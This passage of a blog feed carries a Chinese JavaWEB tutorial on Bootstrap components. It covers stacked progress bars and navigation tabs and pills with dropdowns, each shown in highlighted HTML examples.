class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>45% Complete<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-6-堆叠进度条"><a href="#5-6-堆叠进度条" class="headerlink" title="5.6 堆叠进度条"></a>5.6 堆叠进度条</h3><p>把多个进度条放入同一个 <code>.progress</code> 中，使它们呈现堆叠的效果。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar progress-bar-success&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 35%&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>35% Complete (success)<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar progress-bar-warning progress-bar-striped&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 20%&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>20% Complete (warning)<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress-bar progress-bar-danger&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 10%&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;sr-only&quot;</span>&gt;</span>10% Complete (danger)<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWEB</tag>
      
      <tag>BootStrap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（二十一）BootStrap-组件(二)</title>
    <link href="/2021/08/18/JavaWEB/JavaWEB-%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%80%EF%BC%89BootStrap-%E7%BB%84%E4%BB%B6(%E4%BA%8C)/"/>
    <url>/2021/08/18/JavaWEB/JavaWEB-%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%80%EF%BC%89BootStrap-%E7%BB%84%E4%BB%B6(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<p>Bootstrap 是最受欢迎的 HTML、CSS 和 JS 框架，用于开发响应式布局、移动设备优先的 WEB 项目。Bootstrap是基于HTML、CSS、JavaScript 开发的简洁、直观、强悍的前端开发框架，使得 Web 开发更加快捷。提供了优雅的HTML和CSS规范。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-导航"><a href="#1-导航" class="headerlink" title="1.导航"></a>1.导航</h2><table><thead><tr><th align="left">类</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">.nav nav-tabs</td><td align="left">标签页</td></tr><tr><td align="left">.nav nav-pills</td><td align="left">胶囊式标签页</td></tr><tr><td align="left">.nav nav-pills nav-stacked</td><td align="left">胶囊式标签页以垂直方向堆叠排列的</td></tr><tr><td align="left">.nav-justified</td><td align="left">两端对齐的标签页，在大于 768px 的屏幕上，通过 .nav-justified 类可以很容易的让标签页或胶囊式标签呈现出同等宽度。在小屏幕上，导航链接呈现堆叠样式。</td></tr><tr><td align="left">.disabled</td><td align="left">禁用的标签页</td></tr></tbody></table><p>Bootstrap 中的导航组件都依赖同一个 <code>.nav</code> 类，状态类也是共用的。改变修饰类可以改变样式。</p><p>创建一个标签式的导航菜单：</p><ul><li>以一个带有类 <code>.nav</code> 的无序列表开始。</li><li>添加类 <code>.nav-tabs</code>。</li></ul><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-tabs&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Profile<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Messages<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-1-胶囊式标签页"><a href="#1-1-胶囊式标签页" class="headerlink" title="1.1 胶囊式标签页"></a>1.1 胶囊式标签页</h3><p>使用 <code>.nav-pills</code> 类。只需要使用  <code>.nav-pills</code> 代替 <code>.nav-tabs</code> 即可，其他的步骤与上面相同。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-pills&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Profile<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;presentation&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Messages<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-1-1-垂直式"><a href="#1-1-1-垂直式" class="headerlink" title="1.1.1 垂直式"></a>1.1.1 垂直式</h4><p>胶囊是标签页也是可以垂直方向堆叠排列的。只需添加 <code>.nav-stacked</code> 类。在使用 <code>.nav</code>、<code>.nav-pills</code> 的同时使用  <code>.nav-stacked</code>，让胶囊垂直堆叠。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-pills nav-stacked&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>VB.Net<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Java<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>PHP<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-两端对齐的标签页"><a href="#1-2-两端对齐的标签页" class="headerlink" title="1.2 两端对齐的标签页"></a>1.2 两端对齐的标签页</h3><p>在大于 768px 的屏幕上，通过 <code>.nav-justified</code> 类可以很容易的让标签页或胶囊式标签呈现出同等宽度。在小屏幕上，导航链接呈现堆叠样式。</p><p>通过在分别使用 <code>.nav</code>、<code>.nav-tabs</code> 或 <code>.nav</code>、<code>.nav-pills</code> 的同时使用  <code>.nav-justified</code>，让标签式或胶囊式导航菜单与父元素等宽。在更小的屏幕上，导航链接会堆叠。</p><p><strong>两端对齐的导航条导航链接已经被弃用了。</strong></p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-pills nav-justified&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>VB.Net<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Java<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>PHP<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-禁用链接"><a href="#1-3-禁用链接" class="headerlink" title="1.3 禁用链接"></a>1.3 禁用链接</h3><p>对任何导航组件（标签页、胶囊式标签页），都可以添加 <code>.disabled</code> 类，从而实现<strong>链接为灰色且没有鼠标悬停效果</strong>。这个类只改变 <code>&lt;a&gt;</code> 的外观，不改变功能（即链接功能不受到影响）。可以自己写 JavaScript 禁用这里的链接。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-pills&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;disabled&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS（禁用链接）<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>VB.Net<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Java<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>PHP<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-带下拉菜单的标签页"><a href="#1-4-带下拉菜单的标签页" class="headerlink" title="1.4 带下拉菜单的标签页"></a>1.4 带下拉菜单的标签页</h3><p>导航菜单与下拉菜单使用相似的语法。默认情况下，列表项的锚与一些数据属性协同合作来触发带有 <strong>.dropdown-menu</strong> class 的无序列表。</p><p>向标签添加下拉菜单的步骤如下：</p><ul><li>以一个带有  <strong>.nav</strong> 的无序列表开始。</li><li>添加  <strong>.nav-tabs</strong>。</li><li>添加带有 <strong>.dropdown-menu</strong>  的无序列表。</li></ul><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-tabs&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>VB.Net<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><br>      Java <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Swing<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>jMeter<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>EJB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>分离的链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>PHP<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-5-带下拉菜单的胶囊式标签页"><a href="#1-5-带下拉菜单的胶囊式标签页" class="headerlink" title="1.5 带下拉菜单的胶囊式标签页"></a>1.5 带下拉菜单的胶囊式标签页</h3><p>步骤与创建带有下拉菜单的标签相同，只是需要把 <code>.nav-tabs</code>  改为 <code>.nav-pills</code>。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav nav-pills&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>Home<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>SVN<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>iOS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>VB.Net<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-toggle&quot;</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">&quot;dropdown&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><br>      Java <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;caret&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-menu&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span 